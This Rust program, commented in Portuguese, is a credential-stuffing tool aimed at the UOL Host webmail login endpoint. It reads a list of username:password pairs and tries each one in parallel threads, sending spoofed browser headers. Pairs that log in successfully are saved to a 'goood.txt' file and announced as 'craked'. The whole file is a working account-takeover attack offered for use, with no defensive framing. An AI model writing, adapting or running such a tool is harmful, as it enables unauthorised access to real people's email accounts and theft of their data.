use rayon::iter::IntoParallelIterator;
use rayon::iter::ParallelIterator;
use reqwest::header::{
    HeaderMap, ACCEPT, COOKIE, ORIGIN, REFERER, UPGRADE_INSECURE_REQUESTS, USER_AGENT,
};
use reqwest::{blocking, redirect, Client, ClientBuilder, Response};
use serde_json::Value;
use std::collections::HashMap;
use std::collections::HashSet;
use std::env::args;
use std::fmt::{Arguments, Debug};
use std::fs;
use std::fs::{create_dir, read_to_string};
use std::io::Write;
use std::process::{exit, ExitCode};
use colored::*;
fn main() {
    /// Remover conteudos repetidos
    /// argumentos <arquivo , arquivo de proxys, SaidaDoArquivo, Numero de threads >
    let argss = argumentos::<String>::new().unwrap();
    let _thread_pool = rayon::ThreadPoolBuilder::new() // Alterado para rayon::ThreadPoolBuilder
        .num_threads(argss.ThreadPollNumber as usize)
        .build_global()
        .unwrap();
    if let Ok(BufferArquivo) = read_to_string(argss.filename.clone()) {
        // usei o hashset pois é um forma mais simples do que remover linha duplicas em um vertor
        let mut linesHash = Vec::new();
        for line in BufferArquivo.lines() {
            linesHash.push(line);
        }

        linesHash.into_par_iter().for_each(|x| {
            // Alterado para into_par_iter()
            let split: Vec<&str> = x.split(":").collect();
            if split[0].len() <  8 || split[1].len() < 3{
               return;
            }

            if split.len() == 2 {
                let valor = start(split[0], split[1]);
                match valor {

                    Some(Craked) => {

                        let mut file = fs::OpenOptions::new()
                            .write(true)
                            .create(true)
                            .append(true)
                            .open("goood.txt")
                            .unwrap();
                        let format = format!("{}:{}\n", Craked.0, Craked.1);
                        file.write(format.as_bytes());
                    }
                    _ => {
                        drop(split);
                    }
                }
            }
        });
    } else {
        eprintln!("Arquivo de webmail não encontrado");
    }
}
#[derive(Debug)]
struct argumentos<T>
where
    T: AsRef<str>,
{
    filename: T,
    SaidaValidos: T,
    ThreadPollNumber: i64,
    filenameProxys: Option<T>,
}
impl<T: AsRef<str>> argumentos<T> {
    pub fn new() -> Result<argumentos<String>, ExitCode> {
        let argsEnv: Vec<String> = args().collect();
        if argsEnv.len() < 4 {
            eprintln!(
                "./bin nome_do_arquivo saida_com_sucesso numero_de_threads , filename_proxys"
            );
            exit(1);
        }
        let filename = argsEnv[1].as_str();
        let saida = argsEnv[2].as_str();
        let numero_threads: i64 = argsEnv[3].parse().unwrap_or(50);
        let mut filenameProxy = None;
        if let Some(proxyFilename) = argsEnv.get(4) {
            filenameProxy = Some(proxyFilename.to_owned());
        }
        return Ok(argumentos {
            filename: filename.to_string(),
            SaidaValidos: saida.to_string(),
            ThreadPollNumber: numero_threads,
            filenameProxys: filenameProxy,
        });
    }
    fn validar_argumentos(&self) -> Option<Self> {
        let (filename, saida, threadNumber, proxys) = (
            &self.filename,
            &self.SaidaValidos,
            self.ThreadPollNumber,
            &self.filenameProxys,
        );
        todo!()
    }
}

fn chk() -> Result<reqwest::blocking::ClientBuilder, ()> {
    let mut defaultHeader = HeaderMap::new();
    defaultHeader.insert(
        USER_AGENT,
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36"
            .parse()
            .unwrap()
    );
    defaultHeader.insert(ACCEPT, "*/*".parse().unwrap());
    defaultHeader.insert(COOKIE, "".parse().unwrap());
    defaultHeader.insert(ORIGIN, "https://email.uolhost.com.br".parse().unwrap());
    defaultHeader.insert(REFERER, "https://email.uolhost.com.br/".parse().unwrap());

    defaultHeader.insert(UPGRADE_INSECURE_REQUESTS, "1".parse().unwrap());
    let httpBuilder = blocking::Client::builder().default_headers(defaultHeader);
    Ok(httpBuilder)
}

fn requisao<T: AsRef<str>>(
    builder: reqwest::blocking::ClientBuilder,
    username: &T,
    password: &T,
) -> Result<reqwest::blocking::Response, ()> {
    let mut Payload = HashMap::new();

    Payload.insert("password", password.as_ref());
    Payload.insert("login", username.as_ref());
    Payload.insert("submit", "");
    Payload.insert("lang", "");
    Payload.insert("domain", "");
    Payload.insert("redir_url", "email.uolhost.com.br/");
    let Builder = builder.build().unwrap();

    let response = Builder
        .post("https://email.uolhost.com.br/auth")
        .form(&Payload)
        .send();

    match response {
        Ok(respose) => {
            return Ok(respose);
        }
        _ => {
            eprintln!("Erro no requisição");
            return Err(());
        }
    }
}

fn format(response: reqwest::blocking::Response) -> Result<Value, serde_json::Error> {
    let json_form = serde_json::from_str::<Value>(response.text().unwrap().as_str())?;
    Ok(json_form)
}

fn IsLogado(json: &Value) -> bool {
    let resp = json["status"].as_str();
    match resp {
        Some(chk) => {
            if !chk.contains("error") {
                return true;
            }
            return false;
        }
        _ => false,
    }
}
fn start<T: AsRef<str>>(username: T, password: T) -> Option<(String, String)> {
    let builder = chk().unwrap();
    match requisao(builder, &username.as_ref(), &password.as_ref()) {
        Ok(response) => {
            if response.text().unwrap().contains("guarde") {
                println!("{} ", "Ok craked kkkkkkk".bright_green());
                return Some((username.as_ref().to_string(), password.as_ref().to_string()));
            } else {
                eprintln!(
                    "{}: user {} pass: {} ","Failed".bright_red(),
                    username.as_ref(),
                    password.as_ref()
                );
            }
        }
        Err(valor) => {
            eprintln!("{}:  {:?}","Erro".bright_red() ,valor );
        }
    }
    None
}
